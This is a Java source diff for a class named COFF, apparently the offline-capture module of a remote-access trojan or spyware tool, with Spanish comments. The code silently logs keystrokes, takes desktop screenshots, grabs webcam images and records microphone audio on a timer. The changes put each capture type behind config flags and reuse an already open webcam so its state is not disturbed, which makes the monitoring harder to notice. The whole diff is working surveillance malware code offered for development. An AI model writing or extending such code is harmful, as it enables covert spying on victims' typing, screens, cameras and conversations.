@@ -20,10 +20,14 @@ public class COFF extends Thread implements Interfaz {
     private boolean cooriendoOffline = false;//corriendo offline
     public boolean activo;//activo
     private Interfaz servicio;//servicio
-    private Interfaz kl;//interfax keylogger
-    private int delayEscritorio;//delay entre captura del escritprio
-    private int delayCamara;//delay entre captura de la camara
-    private int delayAudio;//delay entre captura del audio del microfono
+    private Interfaz kl;//interfaz keylogger
+    private boolean capturaOfflineEscritorio = false;
+    private int delayCapturaEscritorio; //delay entre captura del escritprio
+    private boolean capturaOfflineCamara = false;
+    private int delayCapturaCamara;//delay entre captura de la camara
+    private boolean capturaOfflineAudio = false;
+    private int delayCapturaAudio;//delay entre captura del audio del microfono
+    private boolean capturaOfflineKeylogger = false;
     private int delayMinimo;//debe haber un minimo de espera, esta variable contendra el valor minimo de espera
     private long capturaAnteriorEscritorio;//captura anterior
     private long capturaAnteriorCamara;//captura camara|
@@ -37,11 +41,15 @@ public class COFF extends Thread implements Interfaz {
     @Override
     public void instanciar(Object... parametros) {
         this.servicio = (Interfaz) parametros[0];
-        this.delayEscritorio = (Integer) parametros[1];
-        this.kl = (Interfaz) parametros[2];
-        this.prefijo = (String) parametros[3];
-        this.delayCamara = (Integer) parametros[4];
-        this.delayAudio = (Integer) parametros[5];
+        this.kl = (Interfaz) parametros[1];
+        this.prefijo = (String) parametros[2];
+        this.capturaOfflineEscritorio = (Boolean) Inicio.config.obtenerParametro("off-escritorio");
+        this.delayCapturaEscritorio = (Integer) Inicio.config.obtenerParametro("off-escritorio-delay");
+        this.capturaOfflineCamara = (Boolean) Inicio.config.obtenerParametro("off-camara");
+        this.delayCapturaCamara = (Integer) Inicio.config.obtenerParametro("off-camara-delay");
+        this.capturaOfflineAudio = (Boolean) Inicio.config.obtenerParametro("off-audio");
+        this.delayCapturaAudio = (Integer) Inicio.config.obtenerParametro("off-audio-delay");
+        this.capturaOfflineKeylogger = (Boolean) Inicio.config.obtenerParametro("off-keylogger");
         ultimaVezEscritorio = ultimaVezCam = ultimaVezAudio = System.currentTimeMillis();
     }
 
@@ -81,7 +89,10 @@ public class COFF extends Thread implements Interfaz {
 
     private void capturaEscritorio() {
         try {
-            if ((System.currentTimeMillis() - ultimaVezEscritorio) > delayEscritorio) {
+            if (!capturaOfflineEscritorio) {
+                return;
+            }
+            if ((System.currentTimeMillis() - ultimaVezEscritorio) > delayCapturaEscritorio) {
                 long criterio = 0;
                 PantallaBloque bloque;
                 Captura captura;
@@ -107,18 +118,30 @@ public class COFF extends Thread implements Interfaz {
 
     private void capturaCamara() {
         try {
-            if ((System.currentTimeMillis() - ultimaVezCam) > delayCamara) {
+            if (!capturaOfflineCamara) {
+                return;
+            }
+            if ((System.currentTimeMillis() - ultimaVezCam) > delayCapturaCamara) {
                 esperarCopia();//por si acaso se activa la copia despues de pasar el if
                 long criterio = 0;
                 PantallaBloque bloque;
                 Captura captura;
                 bloque = new PantallaBloque();
-                //abro la camara
-                servicio.ejecutar(14);
+
+                Interfaz webCam = (Interfaz) servicio.get(13);
+                boolean mantenerAbierta = true;// si la camara esta siendo usada no la cierra
+                if (webCam == null) {
+                    //abro la camara con parametros default
+                    servicio.ejecutar(14);
+                    mantenerAbierta = false;
+                    webCam = (Interfaz) servicio.get(13);//vuelvo a obtener la camara ya abierta
+                }
                 //tomo los datos de la imagen
-                bloque.setDatos((byte[]) ((Interfaz) servicio.get(13)).get(0));
-                //cierro la camara
-                servicio.ejecutar(15);
+                bloque.setDatos((byte[]) webCam.get(0));
+                if (!mantenerAbierta) {
+//                //cierro la camara
+                    servicio.ejecutar(15);
+                }
                 criterio = UtilRT.generarChecksum(bloque.getDatos());
                 if (criterio != capturaAnteriorCamara) {
                     captura = new Captura();
@@ -142,11 +165,14 @@ public class COFF extends Thread implements Interfaz {
     }
 
     private void setearMinimo() {
-        delayMinimo = Math.min(delayAudio, Math.min(delayCamara, delayEscritorio));
+        delayMinimo = Math.min(delayCapturaAudio, Math.min(delayCapturaCamara, delayCapturaEscritorio));
     }
 
     private void capturaKeyLogger() {
         try {
+            if (!capturaOfflineKeylogger) {
+                return;
+            }
             if (kl != null && (Boolean) kl.get(0)) {
                 esperarCopia();//por si acaso se activa la copia despues de pasar el if
                 UtilRT.agregarTexto(archivoKeylogger, (String) kl.get(1));
@@ -187,7 +213,7 @@ public class COFF extends Thread implements Interfaz {
                     sleep(delayMinimo);
                 } catch (Exception ex) {
                 }
-                esperarCopia();//por si acaso se activa la cpia despues de pasar el if
+                esperarCopia();//por si acaso se activa la copia despues de pasar el if
                 if (!copiando) {
                     //capturas de pantallas
                     capturaEscritorio();
@@ -200,7 +226,6 @@ public class COFF extends Thread implements Interfaz {
                 }
             }
         } catch (Exception ex) {
-
             //servicio.enviarMensaje("Error al realizar captura offline " + ex.getMessage());
             servicio.ejecutar(6, "Error al realizar captura offline " + ex.getMessage());
         }
